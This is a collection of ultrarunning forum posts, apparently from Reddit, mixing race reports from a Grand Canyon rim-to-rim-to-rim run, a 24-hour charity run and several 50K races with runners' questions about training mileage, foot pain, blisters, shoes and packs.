I was still feeling great at the tail end of the this leg. Near Tin Can I passed the fourth place runner, but I wouldn’t find that out until mile 16.

Miles 15.5 - 22

At mile 16-17 (after the turn around) I ran into the group I started with, who let me know I was in 3rd place. Wasn’t expecting this, but for sure wasn’t going to let myself lose it.

Mile 19 was where I started paying for the faster miles early on. Nothing bad, but felt the fatigue and started to dial things back a little...likely not enough though. Knowing I was holding onto third...but not knowing by how much made me push harder.

I made it back to Hollywood feeling pretty good. Took about a minute breather while Ally swapped my food, loaded up the tailwind, and I shook the rocks out of my shoes.

Miles 22-25

This is where things started to fall apart a little. I dialed back to roughly a 9 minute pace coming out of Hollywood. I’d taken a pretty big swig of water and downed some cranberry juice. Stomach wasn’t handling speed well. This leveled out a little, and I was able to get some running around my goal pace, but I was fading fast.

Around here I started to get a sharp pain on the top of my left foot. Not sure what caused it, but from mile 22 to the end, every step was agony.

I was really feeling it when I hit Tunnel AS. Wasn’t terrible though.

Miles 25-31 (Tunnel AS to Finish!)

This sucked. Like really sucked. Remember that surprise elevation? That sucked. I felt okay up until the marathon (3:39!) but after that things started falling apart. The road stretch was awful and the uphills were aggravating my foot. This is when my quads decided that they were done too.

I would up hiking a few of the hills. The road stretch felt like it would never end. 

After the roads I was toast. Clocked mid to high 9s for the rest of the run. At mile 28, I met Ally along the trail and she paced me to the finish. This was a godsend cause I was pretty much ready to walk.

The last two miles were the hardest I’d run in my life. I was ready to just take a nap on the side of the trail. On the bright side though, my legs hurt so much that I barely noticed the pain in my foot.

I survived though. I held on to third place and ran it into the finish. I then walked about twenty feet before I gave up and laid down.

Grand Canyon Rim to Rim to Rim adventure report,"Three years ago I was just a casual runner, running about 20 miles per week. I loved trail running though and would come to learn about the trails in the Grand Canyon and wanted to run across them. I didn’t even know it was a thing people did, but I wanted to run them in one day since I don’t back backpack. I had never even run a marathon and didn’t even know what an ultra marathon was at the time. I spent about 9 months of dedicated training to run R3 in a day, but in the end it wasn’t enough. I made lots of mistakes. I pushed too hard, redlined it the whole time, didn’t control my heart rate going uphill, and didn’t have dry clothes or a jacket for the cold north rim. I made it across in one piece, but was absolutely not prepared for the return, so I took a shuttle back with my tail between my legs. 

The next year 2019 I ran my first marathon followed by three ultra marathons. In 2020 I ran over 2000 miles. With all that extra training and experience being on my legs for extended periods, I felt I was ready for another attempt. So I booked a race schedule around getting a nice buildup to culminate with another R3 attempt.

February - 6 hour trail race
March - 24 hour flat looped race (which I hoped would be my first 100 mile distance, and would be my only effort to match the expected time on feet of R3)
April - very hilly 50k
May - R3

The build up races were a disaster. The 6 hour trail race was cut short because I didn’t have spikes and the trail froze as we were running in the snow, leading to only 17 miles completed. The March race I hit a distance PR of 68 miles within the first 14 hours, but gave myself tendonitis from having my shoes tied too tight, leading to two weeks of zero running. And the 50k I went into very undertrained because of the preceding injury. All that also made my knee start giving me fits. I almost cancelled the whole thing, but my doctor gave me the green light saying I likely wouldn’t cause any permanent damage (just extended recovery). 

Here was my plan: power hike down all of South Kaibab, power hike across the mid canyon with short running bursts just to test my knee on the flat areas, and control my ascent up North Kaibab without burning out like last time. If that all went well, I would give it hell on the way back. If not, I gave myself permission to bail again due to injury. 

Starting down SK my knee was feeling good. It kind of got to 2-3 on the pain scale it had been doing before and just held there, never getting worse. Power hiking is about all I can do anyway, last time it took me 1:45 to get to the river, this time 2:05 just hiking, so not much time even lost with less damage to my legs. 

Across the mid canyon I also did well. I stuck to the plan and only ran for a few short bursts where I had a flat or slight downhill grade. The knee continued to hold up well. I did my first fluid refill at Cottonwood which is about 14 miles in. 

Once you go past Manzanita the climb becomes relentless. You climb for lengths and grades (and altitude) that we simply don’t have in the Midwest, so literally my only experience was of the prior failure in this very spot of the canyon three years prior. I think it helped at least a little to have a HRM this time which I didn’t have before. This let me find a good pace for the hr I was targeting, or at least didn’t want to exceed. Surprisingly, I still bested my slowest mile by 5m/m (45 vs 40) and summited the north rim in fantastic shape, one hour slower than prior. 

After changing socks and lubing up I was ready for the return. There was absolutely no doubt in my mind this time, I was going to finish this thing!! I checked in with my trail buddy Jay I had picked up a few miles back. We had been leap frogging for a while, only he bonked hard over the last 2 miles. He was going to come back, but needed more rest time, so I left him to catch back up later. 

1.7 miles back down I trail returned to Supai tunnel which I didn’t spend long at going up. This time I stopped for a proper rest (my first and only), lunch, and to refill my 2L bladder a second time. During my break Jay came strolling in as expected. We headed out a few minutes later and stayed together all the way back to Manzanita. Normally I really enjoy blasting the downhills. I really wanted to give them hell here and pick up some time, but I’m definitely not used to such loose gravely steep descents that give you little traction, and my knee just didn’t like grades that exceeded ~ -5% grade or so, so I had to power hike the majority of this as well.

Back at Manzanita, Jay really needed another proper stop. He had a hot spot to attend to and also needed to eat. We agreed to separate once more, with me fully expecting that he’d catch me again some number of miles later as he’d been doing for the last 10-12 miles. 

This part of the trail is where things finally start to level off a little. The average grade is typically -2-3% coming back down, which my knee was just fine with. Still, with 28+ miles on my legs, a full 15L pack, and having climbed to 8200 feet just 2 hours ago, I could only manage 15-16 minute miles, with a best mile of 13:25. But I didn’t care. I was doing this thing, and I was doing it strong. And I was still ahead of my suspected paces should I have to walk the whole thing. 

I lucked out so much with the weather. Many people who are more confident with their experience running hills and mountains might do this between November and April. The upshot it you get more moderate temps. The downside is the north rim is closed, so there’s no bail out option. You’re coming back to the south rim the way you came whether you like it or not. Anyway, the weather. I was expecting highs in the upper 80s or low 90s. A couple days earlier it had been those temps and higher. But Saturday 5/22 only got to about 80 degrees as the high at Phantom Ranch. Cruising back down to these lowest altitudes felt warm relative to the rest of the day, but it was still quite comfortable. 

I hit phantom ranch right before the dinner bell was to ring. It was about 4:30 or so and campers and lodgers were gathering for their coveted steak dinner. I refilled my water/Gatorade powder once more, tried to lube inconspicuously, put more food from my pack into my accessible pockets, and quickly headed off to finish my last 9.5 miles. 

The river trail runs alongside the Colorado for 1.7 miles before taking you to Bright Angel trail, the most famed and popular trail in the park. I’d always heard people decry the river trail, and now I know why. Every time you start gaining elevation you quickly lose it. The whole thing is sand; I managed over 35 miles without getting crap in my shoes and 50 paces in my shoe is filling with sand. And then there’s the rocks. Most of the corridor trails are well groomed, but I guess because this one doesn’t get foot traffic from the mules it doesn’t get pounded flat like the rest, so there’s lots of rock sticking up from the trail (it reminded me of the Ozark trail in Missouri). 

Once I hit Bright Angel, it was as beautiful as I could ever expect from being in the desert. Everything was lush green from spring growth. The climb wasn’t too bad. Everything was clicking. I wish I had more to report in this area, but the one thing of note wasn’t what was there, it’s what wasn’t there - Jay. I kept looking over my shoulder expecting him to come up on as he had done many other times, but he never did. The trail was also so desolate, quiet and peaceful for a good six miles or so. I went a few miles without seeing a soul - a rarity for a corridor trail in May. I guess all the rim to rimmers had finished and overnight campers were already down below. At 3 mile rest house though is when I started to run into people desperately trying to get out of the canyon before dark. I passed probably 20 people in the last 2 miles, including one getting emergency help from a ranger.

Once I got to the tunnels I knew I was finally close. The climb up BA isn’t as steep as NK, but it’s longer and it was lonelier not having anyone going my speed. And just like that, I popped out at Bright Angel Trailhead. Moving time 15:45, total time 16:45. Consumed about 4,400 calories of almost all carbs, including 8 liters of Gatorade from powder.

I found out the next day via Facebook that Jay’s foot gave him more grief and he finished an hour behind me. 

Next steps, I need to let my knee rest and heal. It’s really not that bad, but I want it back to 100%, where it was 2 months ago. https://imgur.com/a/RTZx9cZ/",ultrarunning,1622138680
Mountain ultra training in NYC,"I live in NYC and I'm ramping up training for some mountain ultras later in the year (UTMB assuming travel is ok then and Run Rabbit Run) and I'm looking for training route recommendations within a \~6 hour drive.

I've been doing a fair amount of weekend training around Bear Mountain/Harriman/Hudson Highlands which can be quite similar in terms of elevation gain/mile depending on the route (though lacking sustained climbs) but looking to mix things up a bit especially as I start having more of a focus on running doubles on weekends. The White Mountains in NH are probably an obvious choice but also interested to know what other recommendations people have. Thanks!",ultrarunning,1622091270
Opinions on Long sleeve shirts for ultras in hot weather?,"My background before ultras was a lot of long distance hiking where the standard shirt is typically some sort of button down or light weight sun protecting long sleeve shirt. For example, the Columbia PFG series.  

This has typically been what I wear in ultras as well just because I don't like getting sunburnt and I'm comfortable in them and used to them..  I've got a 50k coming up near Phoenix az with pretty high heat forecasted, 94 degrees.  While this isn't all that crazy hot, I live in Flagstaff AZ which is much colder and I don't have much heat acclimation. 

My question for you all is what is your opinion on long sleeve shirts for running in hot weather?  Traditional knowledge seems to be wear as little as possible, but there's also some trends of long sleeve lightweight stuff catching on like those ultralight hoodie's.  Also lots of summer workers like construction workers typically wearing long sleeves for the sun protection.

Running in skirt/kilt,"I was wondering if any of you (I am a guy btw) have tried running in a skirt/kilt. A traditional kilt seems heavy, even the ""sport kilts"" so I'm going to stick with calling it a skirt.

I have been thinking about it for awhile, and can't seem to find a downside, other then stereotypes....

I recently took a pair of running shorts and converted them to skirt. It was a little long for running, but overall worked well. Only issue I had was the length. Once it got wet from sweat it got a little annoying, bit long shorts do the same. 

I did a 20 mile run with no other issues. I did wear compression shorts under, but still felt cooler and had less fabric bunching. 

I have since shortened it to the same length as my compression shorts (mid thigh), so we will see how they work on a short run.",ultrarunning,1621886935

Mileage per week for a 100,"So when I try going past 50 mpw my knees start complaining and I need to take a week or two weeks off.

Tbh, I might only be able to do 40 mpw. My 100 is in early September. 

I've been running for about a year. Did a 50 miler in January in about 12 hours. I only want to finish the 100 in less than 30, but closer to 24 if I can.

Questions:
Is 40 mpw for the next 3 months good enough?

If I run slower will that help my knees? Or maybe I should go faster? I'd I run slower with an increased cadence, I'm still increasing impact right? I imagine this is a scientific question, but what do you think? Should I try getting 50mpw just at a very slow pace like 8:00 min/km?

Curious what lube/tape.. etc you use for (1) blister prevention and (2) once you have blisters? 

Ive seen various recommendations in similar threads, but looking for a compilation here so I can do a bit more research. 

Sometimes even with the right socks and shoes, ya just get em! 

I will use chauff cream sometimes on longer runs in potential hot spots, but again this stuff is expensive. I prefer tape / pads on potential hots spots as prevention vs the chauff cream because my feet feel slippery in my shoes after.

Then blistex blister pads if/when they form. Another product I used to use is now discontinued.

First steps- Mountain 40k in October- does my training plan look ok?,"Not an ultra, sorry if that is not allowed. Building up to ultras. Here in Spain 50k seems to be a less popular distance- the mountain running circuit seems mostly to have events in the 40ish, 60ish, 80ish then 100+ range.

**The race**: 42km approx. with 1800m+ vert, October 16, In El Escorial, NW of Madrid, Mostly on mountain trails, dirt roads.

**Me**: 45M, currently doing 50-60km/week usually, with long runs of up to 32k/20miles, almost all on trails/dirt roads. Mostly hilly runs with frequent mountain outings of 500m+ at weekends.

**Factors to consider**: The heat of summer- sometimes up to 40C (104F) where I live, and very hot weather can last weeks at a time. Not humid. 

**Vague Plan**: because of the heat, a bit of periodization. JUNE, take advantage of long, still relatively cool evenings to work on building speed with one day hill intervals, one day flat intervals. JULY, spend some  time focusing on heat adaptation in order to be able to maintain volume and fitness. Use the fact that running in heat and direct sun is hard to build resilience; AUGUST take some time off work and go hunting vert in the mountains. Do reccy of some of the race route. SEPTEMBER max training load- build to 8+ per week, do reccy of rest of race route, at least one 5hr+ run to test nutrition, hydration, gear, chafing strategies. OCTOBER taper down to the 16th

Sound about right?",ultrarunning,1621507946
Is a 50mi Too Ambitious For My Running Background?,"First off, I'm a long time lurker in this community as I have wanted to dip my toe into ultras for the past year or so and keep coming up with excuses as to why I can't. Looking for some advice from much more experiences folks in this community.

# Background

24M. Former college football player and still a much larger than average runner (6'5"", 215lbs). Started running in 2018 to lose weight, ran my first/only marathon in 2019 (4:09), and was planning on running two more in 2020 but, ya know, \*gestures at everything\*

Cumulative miles in 2019, 2020, 2021 are 888, 1614, 780. Average mileage per week so far in 2021 is 40. I'm currently on week six of a slightly modified Pfitz 18/55, so have had mileage of 46, 42, 45, 49, 52, 50 the past six weeks. Taking a cut-back week this week down to \~35 but in general I feel really good. Long Runs are in the 16-18 range right now. I didn't have a race on the calendar when I started this block and was just going to see where it could take me. I set a goal of 3:30 for training paces and so far, it feels like that's about where my fitness is. Long Runs with MP miles within feel tough but I'm not destroying myself to hit the paces. 

# 50k/50mi

Leading to my main question, I'm itching to get back to racing and in specific, ultras. The 50k I am eyeing is on July 3rd about 10mi from my house. It's in a state park that I'm very familiar with but has a relatively hard profile (1423m). It was one that I was training for last spring so I know the climbs and how much is runnable but I haven't been putting in any trail specific work this year.  I'm also thinking about a 50mi (Stewart Tunnel) that is run in Southern WI on August 1st. It has an easier profile (744m) and a generous cutoff (12hrs). My initial plan was to modify the 18/55 plan to incorporate some long runs on the trails and back-to-backs. I would toss most of the MP specific work out the window and do a LT workout during the week with back-to-back LRs on the weekend. I've been practicing fueling but plan to use those LRs as a time to completely dial that in.

My question is: With only 9 weeks to the 50mi race, will I have enough training base to complete the race? Is 15 weeks, peaking around 60-65, enough for my first 50mi? Would it make sense to run the 50k as my last ""workout"" in 6 weeks and then taper?  Like I said, I feel like I'm overthinking and making excuses as to why I can't. I'm looking for someone to tell me that I'm either biting off more than I can chew or to just do the damn thing and write a race report afterwards.",ultrarunning,1621477812

Early warning signs of bonking,"After a couple of years, I’m still terribly inconsistent with my stomach and nutrition on race days.  I’m pretty sure it’s because I let my guard down at aid stations and wind up eating and drinking less than I think I am.  Usually, by the time I realized I’m in a caloric hole, it’s too late to turn things around and I wind up puking before toughing things out for the rest of the day.  It tends to be really subtle until it hits me like a brick and my stomach is turning over itself, making eating that much harder or impossible before I yack.  I have a plan to help keep on top of this moving forward (including being a lot more intentional with what I eat and the portion size on a more regular schedule), but I’m wondering if anyone has noticed any early warning signs that tell them they need to start eating again before disaster strikes.

Every downhill step was agony as the force traveled up that sore tissue. I thought, ""Well good. I know I'm using my glutes on the uphills, at least.""

2. Complete 100 Km

3. Raise $2000 NZD for cancer support/research

Hours 1-6

Started out at 8.30am with a frost still on the ground. Feet were soaked pretty much straight away, which lead to some rubbing on the inside of my right foot. I band aided up, applied some glide and kept running, as soon as the ground was dry, I changed socks and re did my plasters. Rubbing stopped shortly after and I had no blisters to show but kept the plasters on to be safe. Moved well as was expected, stopping every few Km to grab some apple/orange slices and hydration. Went through the first Marathon in 4.30 and had finished 52 Km at hour 6. I was moving wayyy too fast but some stern words from my coach helped me to focus on the big picture and slow way down. This definitely affected me later, but also meant I had some decent Kms under my belt early.

Hours 7-12

Still jogging most laps with set walking intervals to start with, and everything kept going smoothly till about hour 8.5 when I started getting sharp pains in the top of my right foot. We tried a shoe change, sock change, relaxation techniques and different strapping techniques but not much was helping the pain and it was looking pretty bleak. The sun set and temps dropped right as it was getting really bad which lead to some really slow walked Kms. Luckily at Hour 10ish  we ordered pizzas which was a massive mood boost, and a bunch of students from the dorms came out to run a few laps with me. Shortly after this one of my teachers/ coach tried a new strapping technique which together with a slightly altered running style, reduced foot pain greatly. Stumbled through 82.6km at 12 hours.

Hours 13-18

6 of my running buddies and good friends from school showed up with some tunes and positivity, past half way so my mentality was improving and my foot was feeling better, back to mostly jogging laps with set walking intervals. When they left, they were replaced by teachers and dorm students that had snuck out of bed, cloud cover came in which lifted temperature and hence the mood. One teacher brought a brazier down which was massive. These hours weren’t very fast but time past quickly and the spirits were high. Food and water was going down well, no blisters to speak of, minimal chaffing and not too much pain. At 1am it started to rain lightly which scared us at first but it held off and only rained very lightly for the next few hours, not enough to cause chaffing or make us cold. 16 hours through I had finished 100km which was incredible feeling, and a massive mood boost. Ticked over 109.4km at the 18 hour mark.

Hours 19-24

Slow slow slow. Lots of walking through these laps. People had started leaving at hour 18 so there was only me and a couple of others for a little while, this was tough on my mind but luckily my swim coach and elite ultra-runner showed up with her dog and some excellent advice and chatter. At 3am people started coming for the morning and this kept me going, though still very slowly. A couple hours before dawn I hit another low point as my foot pain returned and I still had 4 hours to go. Lots of supported acted as if I was already done despite a lot of pain and Kms still to go. Could hardly stand for a while there and was emotionally wrecked at the thought of not finishing after doing so much. Kept moving slowly and held out for dawn, after which my pain started reducing. Walked pretty much all the last 6 hours, but minimized stops between laps. Managed to jog for the last lap before I finished with 132.1 Km. Poured with rain as soon as I finished but I didn’t care. Drove the 2 mins home and managed to stay awake long enough to shower and pass out.

Ending thoughts

Super happy with how it went overall. Feel a bit like better pace management at the start could have let me run further, but for a first ultra, let alone 24hrs I am super proud of how it went. Even better is the fact that I raised over $3000 for my charity, which is way more than my goal, and I smashed my 100km goal for the run.

Injured/foot pain. What should I do?,"I've been building up milage nicely for my first 100k race on July 10th.

It wasn't comfortable to walk on so I took 5 days off and cross trained on the bike. I went for a 13k road run Thursday and it was fine so today I did 40k in the hills.  My legs feels great but my foot is SO SORE. I'm worried,  getting close to the event and online articles say scary things like possible fractures.

Is my planning crazy for my first ultra?,"Looking to get feedback from the reddit hive mind. I found out about the Bigfoot 40 race, and think it sounds like an awesome stretch goal. The most I have done so far is a couple half marathons, with a personal best of 2:05 on a relatively flat trail half. I want to work towards doing the Bigfoot 40 in July 2022, that is 43.2 miles and 9,000 feet plus and minus elevation. 

I was looking at the course map and noticed that the first aid station is 12 miles in, the second 14, and the finish 16 from there. So my question is am I crazy to continue training for half marathons like I have in the past, then just run 3 half in a day? I was thinking that I would plan to build mileage to a peak of running a half marathon distance 3 days in a row. 

Is this a smart preparation plan for the next 14 months?",ultrarunning,1621010450

I'm not to concerned about the milage, as I know we both can run it. 

My question is, what is the best way to handle the down time between laps? I'm thinking somewhere between 45-60 min of down time between each lap. Is it best to just relax, or should I/we be walking, stretching, biking or something to stay warm and loose.

How much is too much?,"What’s up friends!

So I’ve been running for almost two years now, and just finished my first 100k on April 10th of this year. I ran a 50 miler last October, and have also run two marathons and two 50k races since I started running (late summer 2019). 

My current schedule for the summer is as follows:

Squaw Peak 50 miler, June 12
Pike Peak 50 miler, July 31
Run Rabbit Run 100 miler, Sept 17

My question for you all is this: am I doing too much, too soon? I’ve always been athletic (25 year old male), and so far the distance running has come easily and happily to me. I’ve had no problem successfully following training plans like the ones found in Relentless Forward Progress, and have found joy in completing every challenge I’ve so far tackled. That being said, Run Rabbit Run is my priority by far, and an injury that affected my ability to finish there would really be a tough hit.

My first ultra...,"Hey everyone, I have my first ultra marathon this weekend which is a 60km road run.

I have been averaging 60km of total weekly milage for the past 3 weeks. What would be a good pacing strategy? Do you think I am prepared enough to make the cut off time? Is the wind going to make or break my day ? Should I run harder at the start and walk up the hills? Or run at a zone 2 pace at the start and run walk the hills?

Olympus 4s - how to tighten down?,"I’m training for my first 100, and now experimenting with the Olympus 4s. I wear a 10.5 in every shoe/brand I’ve ever owned as an adult. I wear 10.5 in the Torin and Superior and they feel great.

Multi-day running trip,"Hi all!
I've been desperately looking for a bigger pack for overnights runs, and considering their price I've been hesitating a lot.
So I currently have a salomon adv skin 12 and I absolutely love it. However, I'm planning a 3days in the Alps this summer, so I will probably need a bigger pack.
 I've been looking at the UD fastpack 25 or 30, the raidlight 24, the omm classic 25. I'd go for a salomon if they had a bigger one because I know it fits me but can't seem to find any above 12L. 
Anyway, I was wondering if anyone had insights into those packs (or other?), knowing I'm a quite small women and I'd like a pack that doesn't bounce around to much. I'm also not sure if I should go for something on the bigger side as I would also like to do a few trips in Scotland, where the weather requires more kit. But then I probably won't be able to run with something to heavy anyway.

Determining pace for first 100 miler,"I'm running my first 100 miler at the end of the month and I'm struggling to decide on a pace plan. In past ultras I'm a front of the middle of the pack runner and typically can accurately guess my pace/ time based on past results but for a couple of reasons I don't feel confident in this strategy.  

1. This race is at elevation and I live at sea level
2. The race is 80% male (I'm female) so im assuming this will significantly shift the results faster? I considered basing my plan on just womens results but in an average year only about 10 women finish the race so its a small sample 


Obviously I'm planning to start slow but im worried about not having the right stuff in the right drop bags at the right times (not taking pacers or crew) and this throwing off my mental strategy.  Am I over thinking this? My goal is just to finish strong",ultrarunning,1620754225

How to become a decent ultra runner rather than a mediocre one,"As of this past weekend, I have run 4 ultras since 2017. I started out with a 50-miler (3000 ft gain), then a 100k (14000 ft gain), then a 38-miler (14000 ft gain), and then this past weekend another 50-miler (11000 ft gain). This past weekend, I was scrambling to meet the cutoff times at the aide stations. Since I started, I've had the mentality, ""walk the uphill sections; run the flats and downhills."" And that was barely enough to meet the cutoff times and fuel myself properly on Saturday. I followed a training plan pretty rigidly since January, and I still feel so mediocre. This course was definitely for better, faster runners, and I'm getting kind of tired of always hustling to meet cutoffs and being stressed about DNF-ing.

How to train for very long races when working full time and raising kids?,"I'm training for my first marathon this fall, but I've been poking at ultramarathon training plans for fun. I found a sample 100k plan [here](https://rigbag.files.wordpress.com/2016/04/ultra-art-1.png). My question as a total noob is: how the heck do you fit in so much training if you're working full time, raising kids, and/or have other hobbies? And this is **only** for a 100k, I assume races like 100 miles and beyond need even more training than this... 

For example, there is a 360 minute Saturday run... that's 6 hours on a Saturday plus I assume I'd be useless afterwards. My wife and young kids would be pretty unhappy if I blew an entire Saturday running and recovering.

I can't even explain why I want to do 100 miles, but I want to.  Maybe it's the challenge, maybe it's because I've read born to run one to many times, maybe because I feel like my life is in a transition and I need a slightly crazy goal to strive for to keep it on track.  Perhaps I just want a belt buckle. I really can't verbalize it. 

Anyway, would it be insane to go for a 100 mile in December from where I'm currently at? Or is it somewhat reasonable.  How do I get from here to there?  Any comments are appreciated.

Race Report- Dirty German 50k,"Race: 
Dirty German 50K Trail Race in Pennypack Park, Philadelphia
Date: 
May 8th, 2021

Conditions: 
Very Cool, Trails were wet and an absolute mudfest. Several stream crossings, mostly singletrack, several miles of crushed stone/paved bike path along the way. 

Preparation: 
I felt really good heading into my first ultramarathon. My training had hit most of the benchmarks I was hoping for. I kept my mileage fairly low- peaking at little over 50 miles a week (almost all trails) and only running 5 days a week to prevent injury. I put in at least 5 long runs of 20+ miles including  a trail marathon 5 weeks prior. Had a good nutrition plan, good taper, good rest. Felt confident. 

Race Day: 
The conditions were much wetter than I expected. Philadelphia had gotten hit with a lot more rain than Delaware the last few days. There would be no dry shoes at any point in the race and the depth of mud/slippage deeply impacted footing, pacing and effort. 

I was fine with letting the leaders get away early on, and settled into a comfortable pace for the first few miles. But after the 2nd mile directly behind two guys, I realized that I was following them too closely, and I wasn't running my own pace. So I sidestepped them and picked things up. Shortly after, a guy passed me (I called him Beardo) and at 4 miles I was tempted to go with him... but this time realized that it was too early and again I needed to run my race, so I let him go. My body felt really great. I was light on my feet and easily able to hop over the deepest mud puddles and jump over logs across the trail (note: this may have been a contributing factor to what happened later).  Felt like it made sense to not have my feet more saturated than absolutely necessary. 

I hit my nutrition goals for the first 10 miles and I was right on my goal pace. As early as 13 miles in, people were already coming back to me and I wasn't pushing. I moved from 8th overall to 7th, and then 6th as we hit the halfway point and started on the second loop. Around mile 14, though, I noticed something strange. A couple of times that I stepped up over a log, I felt my right hamstring begin to tighten, nearly seizing up. I wondered if I had gotten dehydrated already or was low on sodium. I tried to stomach some bacon and potato chips at my next Aid station but I hardly got any in. I walked through the aid station and stretched out my leg lightly. I had no idea what was in store.

Still feeling pretty good, around 16 miles I caught back up to Beardo and moved into 5th place. Again, I was feeling fine in every way but my hamstring, fully knowing that there was a lot more racing to do.  The miles passed and I held my steady pace, but I was so aware of every time I had to bend my legs extra- going up hills, hopping on a rock or log, and had to be extra careful. 
A few miles later my first big seize up happened. It was around the 21 mile mark. I attempted to jump over a low log, only 8 inches off the ground, and my hamstring locked. I stumbled to the side and yelled, trying to pry my leg back straight and get rid of the cramp. It felt like a baseball formed on the back of my leg under the skin. I've dealt with a little cramping here and there, but nothing like this. At the Aid station at mile 23, my family met me. I needed a short break, so I decided to change out my muddy socks and massage my hamstring a little, hoping that this thing would go away. I stopped for a little less than 2 minutes and took off again. My confidence was fading, but it was clear that I couldn't catch the runners in front of me who were way out there, so my real task was just to hold my position. And I had a big gap over 6th place.  I had held an 8:24 pace through the first 22 miles through thick mud, which was right on track for me. But that was when the cramping really hit. 

The last 8 miles were a serious sufferfest.  Both hamstrings began to seize regularly. 6 times in the last 8 miles one of my hamstrings locked up completely, sending my shrieking and crashing onto the ground on the side of the trail, rolling on my side and trying to get my leg to straighten back. But when I straightened it out, my quad would lock up. So each time I tried rolling around into a position where the seizing would stop, then carefully find a way to stand back on my feet without letting it lock again, then walk it out, and then gently try to jog again without lifting my leg too high, or it would start all over. So I'd run for a few minutes at a shuffle, then scream, fall over again, then crawl, walk, and get running again. 
This is where the ultra community showed how awesome it is. An older woman doing the 50 miler stopped and gave me salt tabs. Another woman offered me a gel. A guy helped me get up and then did a 20 second fist pound massage on my hamstring. Another guy shot water into my mouth from his hydration pack, since I had dropped mine off earlier (since stations were only 3-4 miles apart). I would get a few minutes of respite, then everything would lock again. But people were SO encouraging. This is where it was a real gift to have the 25k runners and the 50milers on the course at the same time, because otherwise I would have been out there mostly alone. It was also very humbling to appear so pitiful to everyone who ran past. 
At this point, all these guys that I had developed a mile lead on began catching up, as my pace of jogging, falling, stretching, and walking worked out to 11-12 minute miles.  I realized my top 5 hope was out of reach, so the goal became to finish my first ultra. There were times in the last two miles that I was yelling at my leg on every step- ""DON'T DO IT! DON'T YOU LOCK UP AGAIN!"" I'm sure I was a real joy to be around at that point. 

It was a fascinating experience, because every time the legs relaxed, I would run past a bunch of people, then they'd pass me again when I lay in the ditch down the trail. They'd say things like, ""man I'm so sorry, hang in there."" And then I would awkwardly pass them again 5 minutes later, only to repeat all over again. 
But when I heard the sound of the accordion player at the finish line, I knew I would finish. My second half of the race was over 25+ minutes slower, which is not normal at all for an even paced runner like I tend to be. But I crossed the line, and the first half of my race proved enough to allow me still hobble into a 10th place overall finish and second in my age group- which means I get a coveted German Weather House award!
I'm still not sure the root of my cramping. Weak hamstrings? Low sodium? Seems strange for salt to be an issue for a cool day of low sweat, where I felt like I was taking in a lot of electrolytes. Simply fatigue? I wonder if jumping over all those logs and leaping around mud puddles early on put a strain on my hamstrings that I didn't realize until later.  Or maybe the mud and slick footing made my muscles work much harder than my other marathon distance runs? I really want to figure that out. I've never cramped in a race before, marathon or otherwise. 
Despite the amount of pain, it was a great first experience and left me ready for more. I didn't hit my stretch goals of top 5 and sub 4:30 on this course, but I hit my base goals of finishing, making top 10, and placing in my age group. The ultra community is supportive, fun, and compassionate, and the race was wonderfully organized, despite all the unavoidable mud.  My family was incredible in their crewing  and encouragement. Can't wait to get back at it in the future.  For now, it's time to recover.",ultrarunning,1620587711
“Pumped” calves that won’t go away?,"I transitioned from Brooks Cascadias to Altras in November and have been running an average of 25-30mi/week with no issues. I’ve been happy in the altras and love the space and cushion. However, about a month ago, my calves began getting super tight particularly on uphills (I do a good bit of climbing/mountain running) and they’ve only continued to get worse. The tightness definitely correlated with increasing vert, and some speed increase now that trails are melted out, and I’ve been mountain biking a little. So... definitely an up in training load which makes sense, but I’ve been running in the Altras for months without issue so I don’t think it’s poor transitioning (as it is for many). Perhaps I upped my training too much too quick, but it didn’t feel that way to me... Foam rolling and some PT has helped but I’m worried because summer is here and I have some ultras coming up and want to be able to keep increasing mileage and vert but am really limited now. My calves tighten up so much and feel pumped like your forearms when you climb a lot, if there are any climbers out here who know the feeling. It’s awful, and if I don’t stay on too of rest and rolling and PT, it ends up pulling through my Achilles and heel, which is super concerning. 

My PT said she didn’t think the shoes were a problem and instead we’re working on ankle flexion and strength to make sure I’m not just relying on my calves more than I should. But my friend who was in Altras for a bit said she had the same issue and once she swapped to Hoka Speedgoats it went away. I tried them on and liked the feel, and I like that they’re still a relatively low drop. I guess I’m caught up in the zero drop hype but I do like my Altras, and I think they’ve helped my form, but if I can’t run at all then they definitely aren’t worth it. Ha! 

I’m wondering if anyone else has experienced this in the Altras and if so what you did about it. I am super happy to change shoes again (to the Hokas probably) but also don’t wanna go chasing false solutions if my issue really is just form or something PT can fix.",ultrarunning,1620586162

### Beforehand
A month-ish earlier, some previously stable part of my brain decided to go on hiatus and I spontaneously signed up for my first 50K running race, this one conveniently local to my hometown of Syracuse. That first taste of ultramarathoning went swimmingly in most regards; I covered three hilly park loops in just under four hours, with the only caveat coming from a navigation fuckup that left me without an official finish. Ah well.

So, back to the race registration search, looking anywhere within drive-and-one-night-in-a-hotel distance for another 50K in May or June. All of the big and “good” events were long since full; a couple little oddballs around the area had space, and I settle on the Greater Long Island Running Club’s (GLIRC) Greenbelt race. The elevation total (~3500 feet) looks the same as what I did in April; it’s Long Island, that can’t be that hard, right? Lots of previous years’ winners came through in 4:20s, 4:30s -- holy shit, can I win this thing?

I’ve got plenty of training distance in my legs, hitting 1100 miles for 2021 just before heading over to Long Island. What I don’t have, though, is a particular focus on elevation or trail running. I’ve been running from my home and around the roads on various loops -- in a flat neighborhood that’s part of a fairly flat city. In the week-ish between registering and racing, I push myself out a bit to get some more short stretches of singletrack, and even add in a day of hill repeats (three of them!). It’s obviously far too late to have any physical benefit, but I tell myself I’ll at least be a little more mentally comfortable on race day.

### Getting There
I ask the group chat of teachers in my preschool classroom if anyone else has already put in a time off request for the Friday before the race. Uh, yes, someone does; there goes my morning departure. We do have our awesome occupational therapist coming in to lead an afternoon activity, though, so I at least get to duck out at noon to start my six-ish hour schlep. That, of course, puts me on the inbound George Washington Bridge right at 5:00… and 5:10… and 5:20…

I make it to the start point in Plainview, switch from teacher pants into running shorts in a portapotty, and head off on the course with a mix of light jogging the driving malaise out of my legs and also walking/googling nearby pizza places. The ~1.5 miles of trail that I see are smooth dirt, rolling a bit, narrow -- still not my comfort zone of “sidewalk” but definitely doable! Back to the car, pizza acquired, into the hotel with a broken TV and choppy wifi to flop around for a few hours and prep my race day gear.

### Morning Of
